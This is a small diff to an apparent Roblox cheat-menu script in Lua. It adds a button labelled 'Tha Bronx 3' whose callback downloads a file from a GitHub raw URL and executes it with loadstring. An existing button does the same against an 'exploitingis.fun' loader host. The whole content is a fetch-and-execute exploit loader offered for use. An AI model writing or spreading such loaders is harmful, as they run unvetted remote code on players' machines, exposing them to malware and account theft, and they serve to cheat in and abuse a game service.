@@ -47,3 +47,10 @@ local Button = Tab:CreateButton({
        loadstring(game:HttpGet('https://api.exploitingis.fun/loader', true))()
 	end
 })
+local Button = Tab:CreateButton({
+	Name = "Tha Bronx 3",
+	Description = nil,
+	Callback = function()
+       loadstring(game:HttpGet("https://raw.githubusercontent.com/bronxkid/thabronx3/refs/heads/main/e"))()
+	end
+})
